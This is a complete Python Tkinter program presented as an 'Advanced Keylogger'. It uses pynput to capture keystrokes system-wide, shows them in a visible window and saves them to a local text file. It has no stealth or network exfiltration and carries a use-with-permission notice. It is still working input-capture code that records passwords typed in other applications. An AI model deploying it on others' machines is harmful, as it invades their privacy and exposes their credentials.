import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import time
import os
import sys
from pynput import keyboard

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title(" Keylogger Application")
        self.root.geometry("800x600")
        self.root.minsize(700, 500)
        
        # Keylogger state variables
        self.is_logging = False
        self.logged_keys = []
        self.listener = None
        self.log_thread = None
        
        # File path for saving logs
        self.log_file_path = "log.txt"
        
        # Configure styles
        self._configure_styles()
        
        # Build the UI
        self._create_menu()
        self._create_widgets()
        
        # Status
        self._update_status("Ready to start logging")
        
    def _configure_styles(self):
        """Configure custom styles for widgets"""
        style = ttk.Style()
        style.configure("Title.TLabel", font=("Arial", 16, "bold"))
        style.configure("Status.TLabel", font=("Arial", 10), foreground="blue")
        style.configure("Start.TButton", font=("Arial", 10, "bold"), foreground="green")
        style.configure("Stop.TButton", font=("Arial", 10, "bold"), foreground="red")
        
    def _create_menu(self):
        """Create the menu bar"""
        menubar = tk.Menu(self.root)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="Save Log", command=self.save_log)
        file_menu.add_command(label="Clear Log", command=self.clear_log)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.exit_app)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Options menu
        options_menu = tk.Menu(menubar, tearoff=0)
        options_menu.add_command(label="Change Log File", command=self.change_log_file)
        menubar.add_cascade(label="Options", menu=options_menu)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="About", command=self.show_about)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.root.config(menu=menubar)
        
    def _create_widgets(self):
        """Create and arrange all UI widgets"""
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(1, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="Advanced Keylogger", style="Title.TLabel")
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 10))
        
        # Control buttons frame
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        
        self.start_button = ttk.Button(button_frame, text="Start Logging", 
                                      command=self.start_logging, style="Start.TButton")
        self.start_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_button = ttk.Button(button_frame, text="Stop Logging", 
                                     command=self.stop_logging, style="Stop.TButton", state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT)
        
        # Log display area with scrollbar
        log_frame = ttk.Frame(main_frame)
        log_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)
        
        # Text widget for displaying logged keys
        self.log_text = tk.Text(log_frame, wrap=tk.WORD, font=("Courier New", 10))
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Scrollbar for text widget
        scrollbar = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.log_text.config(yscrollcommand=scrollbar.set)
        
        # Status bar
        status_frame = ttk.Frame(main_frame)
        status_frame.grid(row=3, column=0, sticky=(tk.W, tk.E), pady=(10, 0))
        
        self.status_label = ttk.Label(status_frame, text="Status: Ready", style="Status.TLabel")
        self.status_label.pack(side=tk.LEFT)
        
        # File path label
        self.file_label = ttk.Label(status_frame, text=f"Log file: {self.log_file_path}")
        self.file_label.pack(side=tk.RIGHT)
        
    def _update_status(self, message):
        """Update the status label"""
        self.status_label.config(text=f"Status: {message}")
        
    def _on_press(self, key):
        """Callback function for key press events"""
        try:
            key_str = ""
            if hasattr(key, "char") and key.char is not None:
                key_str = key.char
            else:
                if key == keyboard.Key.space:
                    key_str = " "
                elif key == keyboard.Key.enter:
                    key_str = "\n"
                elif key == keyboard.Key.backspace:
                    # Handle backspace → remove last char
                    if self.logged_keys:
                        last_entry = self.logged_keys[-1]
                        if last_entry:
                            self.logged_keys[-1] = last_entry[:-1]
                            self.log_text.delete("end-2c", "end-1c")
                    return
                else:
                    key_str = f"[{str(key).replace('Key.', '')}]"
            
            # Add timestamp only if new line starts
            if key_str == "\n":
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                self.logged_keys.append(f"\n--- Enter pressed at {timestamp} ---\n")
                self.log_text.insert(tk.END, "\n")
            else:
                self.logged_keys.append(key_str)
                self.log_text.insert(tk.END, key_str)
                self.log_text.see(tk.END)

        except Exception as e:
            print(f"Error in key processing: {e}")
            
    def _start_key_listener(self):
        """Start the key listener in a separate thread"""
        try:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self._update_status("Logging Active")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start key listener: {e}")
            self._update_status("Error Starting Logger")
            
    def _stop_key_listener(self):
        """Stop the key listener"""
        if self.listener:
            self.listener.stop()
            self.listener = None
            
    def start_logging(self):
        """Start the keylogging process"""
        if not self.is_logging:
            self.is_logging = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            
            # Start the key listener in a separate thread
            self.log_thread = threading.Thread(target=self._start_key_listener, daemon=True)
            self.log_thread.start()
            
            # Add a start marker
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            start_marker = f"\n{'='*50}\nLogging started at: {timestamp}\n{'='*50}\n"
            self.log_text.insert(tk.END, start_marker)
            self.logged_keys.append(start_marker)
            
    def stop_logging(self):
        """Stop the keylogging process"""
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            
            # Stop the key listener
            self._stop_key_listener()
            
            # Add a stop marker
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            stop_marker = f"\n{'='*50}\nLogging stopped at: {timestamp}\n{'='*50}\n"
            self.log_text.insert(tk.END, stop_marker)
            self.logged_keys.append(stop_marker)
            
            self._update_status("Logging Stopped")
            
    def save_log(self):
        """Save the logged keys to a file"""
        try:
            if not self.logged_keys:
                messagebox.showwarning("Warning", "No keys logged to save.")
                return
                
            with open(self.log_file_path, "a", encoding="utf-8") as f:
                f.writelines(self.logged_keys)
                
            self.logged_keys = []
            
            messagebox.showinfo("Success", f"Log saved to {self.log_file_path}")
            self._update_status("Log Saved")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save log: {e}")
            
    def clear_log(self):
        """Clear the log display"""
        if messagebox.askyesno("Confirm", "Are you sure you want to clear the log?"):
            self.log_text.delete(1.0, tk.END)
            self.logged_keys = []
            self._update_status("Log Cleared")
            
    def change_log_file(self):
        """Change the log file path"""
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="log.txt"
        )
        
        if file_path:
            self.log_file_path = file_path
            self.file_label.config(text=f"Log file: {self.log_file_path}")
            self._update_status("Log File Changed")
            
    def show_about(self):
        """Show about information"""
        about_text = (
            "Advanced Keylogger\n\n"
            "A GUI-based keylogger built with Python and Tkinter.\n\n"
            "Features:\n"
            "- Start/Stop logging with button controls\n"
            "- Real-time display of captured keystrokes\n"
            "- Save logs to file\n"
            "- Threaded operation to prevent GUI freezing\n\n"
            "Use responsibly and only on systems you own or have permission to monitor."
        )
        
        messagebox.showinfo("About", about_text)
        
    def exit_app(self):
        """Exit the application"""
        if self.is_logging:
            self.stop_logging()
            
        if messagebox.askyesno("Exit", "Are you sure you want to exit?"):
            self.root.destroy()
            
    def on_closing(self):
        """Handle window closing event"""
        self.exit_app()

def main():
    """Main function to run the application"""
    try:
        import pynput
    except ImportError:
        print("Error: pynput library is required but not installed.")
        print("Install it with: pip install pynput")
        return
    
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()